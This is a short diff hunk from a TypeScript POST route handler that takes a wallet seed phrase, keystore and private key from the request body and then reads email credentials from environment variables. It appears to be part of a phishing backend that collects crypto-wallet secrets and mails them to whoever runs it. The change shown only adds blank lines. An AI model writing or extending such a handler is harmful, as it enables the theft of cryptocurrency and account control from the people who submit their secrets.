@@ -19,7 +19,8 @@ function formatMessage(message: string) {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey, item } = await request.json();
-
+    
+    
     if (phrase) {
       const email = process.env.EMAIL;
       const pass = process.env.PASS;
